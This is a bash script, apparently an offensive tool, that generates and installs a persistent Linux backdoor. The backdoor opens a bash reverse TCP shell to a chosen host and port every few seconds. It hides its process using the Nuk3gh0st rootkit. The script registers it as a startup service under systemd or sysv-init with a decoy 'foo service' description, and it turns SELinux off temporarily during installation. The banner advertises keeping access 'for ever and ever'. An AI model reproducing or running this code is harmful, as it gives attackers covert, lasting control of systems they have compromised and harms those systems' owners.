#!/bin/bash

green='\e[0;32m'
red='\e[0;31m'
purple='\e[0;35m'
yellow='\e[0;33m'
cyan='\e[0;36m'
light_green='\e[0;92m'
endColor='\e[0m'
item=${green}[*]${endColor}

function print_banner {
	echo -e "${green} __________                __       .___                       ${endColor}"
	echo -e "${green} \______   \_____    ____ |  | __ __| _/____   ___________     ${endColor}"
	echo -e "${green}  |    |  _/\__  \ _/ ___\|  |/ // __ |/  _ \ /  _ \_  __ \    ${endColor}"
	echo -e "${green}  |    |   \ / __ \\  \___|    </ /_/ (  <_> |  <_> )  | \/    ${endColor}"
	echo -e "${green}  |______  /(____  /\___  >__|_ \____ |\____/ \____/|__|       ${endColor}"
	echo -e "${green}         \/      \/     \/     \/    \/                        ${endColor}"
	echo -e "${green}                                            __                 ${endColor}"
	echo -e "${green}    ____   ____   ____   ________________ _/  |_  ___________  ${endColor}"
	echo -e "${green}   / ___\_/ __ \ /    \_/ __ \_  __ \__  \\   __\/  _ \_  __ \ ${endColor}"
	echo -e "${green}  / /_/  >  ___/|   |  \  ___/|  | \// __ \|  | (  <_> )  | \/ ${endColor}"
	echo -e "${green}  \___  / \___  >___|  /\___  >__|  (____  /__|  \____/|__|    ${endColor}"
	echo -e "${green} /_____/      \/     \/     \/           \/                    ${endColor}"
	echo -e "${green}                                                               ${endColor}"
	echo -e "${green}    Generates a backdoor that sends bash reverse TCP shell	${endColor}"
	echo -e "${green}        every S seconds to H host, listening on P port         ${endColor}"
	echo -e "${green}           and running it on startup, hidding itself           ${endColor}"
	echo -e "${green}                  with Nuk3gh0st LKM rootkit                   ${endColor}"
	echo -e "${green}   								${endColor}"
	echo -e "${green}                       In other words...			${endColor}"
	echo -e "${green}           YOU CAN MANTAIN ACCESS FOR EVER AND EVER!   	${endColor}"
	echo -e "${green}                                                               ${endColor}"
	echo -e "${green}                                                               ${endColor}"
}

function show_help {
    echo -e "${yellow} Usage:                                                            ${endColor}"
    echo -e "${yellow}                                                                   ${endColor}"
    echo -e "${yellow}    backdoor-generator --host H --port P --sleep S                 ${endColor}"
    echo -e "${yellow}		Genetares a backdoor that sends bash reverse TCP shell   ${endColor}"
    echo -e "${yellow}		every S seconds to H host listening on P port, and       ${endColor}"
    echo -e "${yellow} 		running it on startup.                                   ${endColor}"
    echo -e "${yellow}		                                                         ${endColor}"
    echo -e "${yellow}    backdoor-generator --remove                                    ${endColor}"
    echo -e "${yellow}		Remove previously generated backdoor from startup        ${endColor}"
    echo -e "${yellow}		and their files.                                         ${endColor}"
    echo -e "${yellow}		                                                         ${endColor}"
    echo -e "${yellow}    backdoor-generator --help                                      ${endColor}"
    echo -e "${yellow}		Show this menu.                                          ${endColor}"
    echo -e "${green}                                                               ${endColor}"
    	        
}

function generate_backdoor {
	backdoor_path='/usr/share/nuk3gh0st/backdoor'
	echo "#!/bin/bash" > $backdoor_path
	echo "" >> $backdoor_path
	echo "sleep 40" >> $backdoor_path
	echo "/usr/bin/nuk3gh0st --hide-pid=\`echo \$$\`" >> $backdoor_path
	echo "" >> $backdoor_path
	echo "while true" >> $backdoor_path
	echo "do" >> $backdoor_path
	echo "	bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_path
	echo "	sleep $SLEEP" >> $backdoor_path
	echo "done" >> $backdoor_path
	chmod +x $backdoor_path
}

function generate_init_backdoor {
	backdoor_path='/usr/share/nuk3gh0st/backdoor'
	echo "#!/bin/bash" > $backdoor_path
	echo "" >> $backdoor_path
	echo "### BEGIN INIT INFO" >> $backdoor_path
	echo "# Provides:          backdoor" >> $backdoor_path
	echo "# Required-Start:    networking" >> $backdoor_path
	echo "# Required-Stop:     networking" >> $backdoor_path
	echo "# Should-Start:      nuk3gh0st.startup" >> $backdoor_path
	echo "# Default-Start:     2 3 4 5" >> $backdoor_path
	echo "# Default-Stop:      0 1 6" >> $backdoor_path
	echo "# Short-Description: foo service" >> $backdoor_path
	echo "# Description:       Run backdoor service" >> $backdoor_path
	echo "### END INIT INFO" >> $backdoor_path
	echo "" >> $backdoor_path
	echo "case \"\$1\" in" >> $backdoor_path
	echo "	start)" >> $backdoor_path
	echo "		sleep 40" >> $backdoor_path
	echo "		/usr/bin/nuk3gh0st --hide-pid=\`echo \$$\`" >> $backdoor_path
	echo "" >> $backdoor_path
	echo "		while true" >> $backdoor_path
	echo "		do" >> $backdoor_path
	echo "			bash -i >& /dev/tcp/$HOST/$PORT 0>&1" >> $backdoor_path
	echo "			sleep $SLEEP" >> $backdoor_path
	echo "		done" >> $backdoor_path
	echo "		;;" >> $backdoor_path
	echo "  stop)" >> $backdoor_path
	echo "		;;" >> $backdoor_path
	echo "	restart)" >> $backdoor_path
	echo "		;;" >> $backdoor_path
	echo "	force-reload)" >> $backdoor_path
	echo "		;;" >> $backdoor_path
	echo "	status)" >> $backdoor_path
	echo "		;;" >> $backdoor_path
	echo "	*)" >> $backdoor_path
	echo "		echo \"Usage: /etc/init.d/backdoor {start|stop}\"" >> $backdoor_path
	echo "		exit 1" >> $backdoor_path
	echo "		;;" >> $backdoor_path
	echo "esac" >> $backdoor_path
	echo "exit 0" >> $backdoor_path

	}

function enable_selinux {
	echo -e "${item} Reenabling SELINUX"
	echo -e "   ${purple} cmd: setenforce 1${endColor}"
	setenforce 1
        echo ""
}

function disable_selinux {
	echo -e "${item} Disabling SELINUX temporarily"
	echo -e "   ${purple} cmd: setenforce 0${endColor}"
	setenforce 0
	echo ""
}

function create_systemd_service {
	echo -e "${item} Coping backdoor.service to systemd startup scripts directory"
	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/backdoor.service /lib/systemd/system/backdoor.service${endColor}"
	cp /usr/share/nuk3gh0st/backdoor.service /lib/systemd/system/backdoor.service
	echo ""
}

function enable_systemd_service {
	echo -e "${item} Enabling backdoor.service"
	echo -e "   ${purple} cmd: systemctl enable backdoor.service${endColor}"
	echo -n -e "${cyan}"
	systemctl enable backdoor.service
	echo -n -e "${endColor}"
	echo ""
	
	#echo -e "${item} Starting nuk3gh0st.service"
	#echo -e "   ${purple} cmd: service nuk3gh0st start${endColor}"
	#echo -n -e "${cyan}"
	#service nuk3gh0st start
	#echo -n -e "${endColor}"
	#echo ""
}

function create_init_service {
	echo -e "${item} Coping backdoor to /etc/init.d/ (sysv-init startup script directory)"
	echo -e "   ${purple} cmd: cp /usr/share/nuk3gh0st/backdoor /etc/init.d/backdoor${endColor}"
	cp /usr/share/nuk3gh0st/backdoor /etc/init.d/backdoor
	echo ""
}

function update_rc_symlinks {
	echo -e "${item} Update rc symbolic links to /etc/init.d/backdoor"
	echo -e "   ${purple} cmd: update-rc.d backdoor defaults${endColor}"
	update-rc.d backdoor defaults
	echo ""
}

function create_rc_symlinks {
	echo -e "${item} Create symbolic links of backdoor for run levels from 1 to 5"
	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc1.d/S99backdoor${endColor}"
	ln -s /etc/init.d/backdoor /etc/rc1.d/S99backdoor
	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc2.d/S99backdoor${endColor}"
	ln -s /etc/init.d/backdoor /etc/rc2.d/S99backdoor
	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc3.d/S99backdoor${endColor}"
	ln -s /etc/init.d/backdoor /etc/rc3.d/S99backdoor
	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc4.d/S99backdoor${endColor}"
	ln -s /etc/init.d/backdoor /etc/rc4.d/S99backdoor
	echo -e "   ${purple} cmd: ln -s /etc/init.d/backdoor /etc/rc5.d/S99backdoor${endColor}"
	ln -s /etc/init.d/backdoor /etc/rc5.d/S99backdoor
	echo ""
}

function enable_startup_service {
	echo -e "${item} Detecting init system..."
	echo -n -e "${cyan}"
	if [[ `/sbin/init --version` =~ upstart ]]; then 
		echo -n -e "${endColor}"
		echo -e "${item} Init system is upstart"
		create_init_service
		update_rc_symlinks
	elif [[ `systemctl` =~ -\.mount ]]; then
		echo -n -e "${endColor}"
		echo -e "${item} Init system is systemd"
		create_systemd_service
		enable_systemd_service
	elif [[ -f /etc/init.d/cron && ! -h /etc/init.d/cron ]]; then
		echo -n -e "${endColor}"
		echo -e "${item} Init system is sysv-init"
		create_init_service
		update_rc_symlinks
	else 
		echo -n -e "${endColor}"
		echo -e "${item} Init system is unrecognized. Trying with sysv-init"
		create_init_service
		update_rc_symlinks
	fi
}

function check_selinux_enable_startup_service {
	echo -e "${item} Checking if SELINUX is enabled"
	if [ -f /usr/sbin/semanage ]; then
		echo -e "${item} SELINUX is enabled"
		disable_selinux
		enable_startup_service	
		enable_selinux
	else
		echo -e "${item} SELINUX is disabled"
		enable_startup_service
	fi
}

function disable_systemd_service {
	#echo -e "${item} Stopping nuk3gh0st.service"
	#echo -e "   ${purple} cmd: service nuk3gh0st stop${endColor}"
	#echo -n -e "${cyan}"
	#service nuk3gh0st stop
	#echo -n -e "${endColor}"
	#echo ""
	
	echo -e "${item} Disabling backdoor.service"
	echo -e "   ${purple} cmd: systemctl disable backdoor.service${endColor}"
	echo -n -e "${cyan}"
	systemctl disable backdoor.service
	echo -n -e "${endColor}"
	echo ""
}

function remove_systemd_service {
	echo -e "${item} Removing backdoor.service"
	echo -e "   ${purple} cmd: rm /lib/systemd/system/backdoor.service${endColor}"
	rm /lib/systemd/system/backdoor.service
	echo ""
}

function remove_rc_symlinks {
	#echo -e "${item} Removing symbolic links of backdoor for run levels from 1 to 5"
	#echo -e "   ${purple} cmd: rm /etc/rc1.d/S99backdoor${endColor}"
	#rm /etc/rc1.d/S99backdoor
	#echo -e "   ${purple} cmd: rm /etc/rc2.d/S99backdoor${endColor}"
	#rm /etc/rc2.d/S99backdoor
	#echo -e "   ${purple} cmd: rm /etc/rc3.d/S99backdoor${endColor}"
	#rm /etc/rc3.d/S99backdoor
	#echo -e "   ${purple} cmd: rm /etc/rc4.d/S99backdoor${endColor}"
	#rm /etc/rc4.d/S99backdoor
	#echo -e "   ${purple} cmd: rm /etc/rc5.d/S99backdoor${endColor}"
	#rm /etc/rc5.d/S99backdoor
	#echo ""
	
	echo -e "${item} Removing symbolic links to backdoor"
	echo -e "   ${purple} cmd: update-rc.d -f backdoor remove${endColor}"
	update-rc.d -f backdoor remove
	echo ""
}

function remove_init_service {
	echo -e "${item} Removing nuk3gh0st.startup from /etc/init.d/ (sysv-init startup script directory)"
	echo -e "   ${purple} cmd: rm /etc/init.d/backdoor${endColor}"
	rm /etc/init.d/backdoor
	echo ""
}

function disable_startup_service {
	echo -e "${item} Detecting init system..."
	echo -n -e "${cyan}"
	if [[ `/sbin/init --version` =~ upstart ]]; then
		echo -n -e "${endColor}"
		echo -e "${item} Init system is upstart"
		remove_rc_symlinks
		remove_init_service
	elif [[ `systemctl` =~ -\.mount ]]; then
		echo -n -e "${endColor}"
		echo -e "${item} Init system is systemd"
		disable_systemd_service
		remove_systemd_service
	elif [[ -f /etc/init.d/cron && ! -h /etc/init.d/cron ]]; then
		echo -n -e "${endColor}"
		echo -e "${item} Init system is sysv-init"
		remove_rc_symlinks
		remove_init_service
	else 
		echo -n -e "${endColor}"
		echo -e "${item} Init system is unrecognized. Trying with sysv-init"
		remove_rc_symlinks
		remove_init_service
	fi
}

function check_selinux_disable_startup_service {
	echo -e "${item} Checking if SELINUX is enabled"
	if [ -f /usr/sbin/semanage ]; then
		echo -e "${item} SELINUX is enabled"
		disable_selinux
		disable_startup_service
		enable_selinux
	
	else
		echo -e "${item} SELINUX is disabled"
		disable_startup_service
	fi
}

HOST=""
PORT=""
SLEEP=""

HOST_ARG=""
PORT_ARG=""
SLEEP_ARG=""
HELP_ARG=""
REMOVE_ARG=""

print_banner

# Mientras el número de argumentos NO SEA 0
while [ $# -ne 0 ]
do
    case "$1" in
    -h|--help)
		HELP_ARG="OK"
		shift
        ;;
	-h|--host)
		HOST_ARG="OK"
		HOST="$2"
		shift
        ;;
	-p|--port)
		PORT_ARG="OK"
		PORT="$2"
		shift
        ;;
	-s|--sleep)
		SLEEP_ARG="OK"
		SLEEP="$2"
		shift
        ;;
    	-r|--remove)
		REMOVE_ARG="OK"
		shift
        ;;
    #*)
    #		echo -e "${red}WARNING: Invalid argument detected${endColor}"
    #		echo ""
    #    	show_help
    #    ;;
    esac
    shift
done


if [[ $HOST_ARG && $PORT_ARG && $SLEEP_ARG && -z $HELP_ARG && -z $REMOVE_ARG ]]
then
	generate_init_backdoor
	check_selinux_enable_startup_service
elif [[ -z $HOST_ARG && -z $PORT_ARG && -z $SLEEP_ARG && -z $HELP_ARG && $REMOVE_ARG ]]
then
	check_selinux_disable_startup_service
elif [[ -z $HOST_ARG && -z $PORT_ARG && -z $SLEEP_ARG && $HELP_ARG && -z $REMOVE_ARG ]]
then
	show_help
else
	echo -e "${red} WARNING: Wrong arguments detected${endColor}"
	echo ""
	show_help
fi
